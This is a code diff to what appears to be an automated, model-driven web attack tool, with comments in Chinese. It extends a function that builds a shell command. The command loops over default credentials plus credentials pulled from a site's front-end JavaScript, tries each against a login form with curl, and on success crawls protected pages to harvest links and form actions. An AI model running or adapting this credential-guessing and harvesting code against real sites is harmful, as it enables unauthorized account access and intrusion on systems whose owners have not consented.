@@ -8,6 +8,7 @@
 """
 from __future__ import annotations
 
+import json
 import re
 import shlex
 
@@ -164,7 +165,17 @@ def render(edge: Edge, base_url: str) -> str | None:
                 user_param = name
             if name.lower() in ("pass", "password", "pwd", "passwd"):
                 pass_param = name
-        creds = " ".join(_q(c) for c in COMMON_CREDS)
+        creds = list(COMMON_CREDS)
+        # 图从前端代码里翻出来的凭据优先加进来：模型为此把 JS 读了五遍都没用上，
+        # 而代码一次就能解出来。
+        try:
+            extra = json.loads(edge.payload_note or "[]")
+        except Exception:
+            extra = []
+        for item in extra:
+            if item and item not in creds:
+                creds.append(item)
+        creds_text = " ".join(_q(c) for c in creds)
         # 登录成功后必须顺手把受保护页面里的入口抓出来——否则图是空的，
         # 下一步又只能靠模型瞎猜。这一步合进同一条命令，不额外花步数。
         harvest = (" ; for u in / /dashboard.php /dashboard /index.php /home /profile.php; do "
@@ -174,7 +185,7 @@ def render(edge: Edge, base_url: str) -> str | None:
                    "\"$BASE$u\"; echo; "
                    "grep -oE 'href=\"[^\"]+\"|action=\"[^\"]+\"' /tmp/.deepsick_page "
                    "| grep -vE 'https?://|#|\\.css|\\.js' | head -30; done")
-        return (f"BASE={_q(base_url.rstrip('/'))} ; for c in {creds}; do "
+        return (f"BASE={_q(base_url.rstrip('/'))} ; for c in {creds_text}; do "
                 f"u=\"${{c%%:*}}\"; pw=\"${{c##*:}}\"; "
                 f"rm -f {SESSION_FILE}; "
                 f"r=$(curl -sS -c {SESSION_FILE} -o /dev/null "
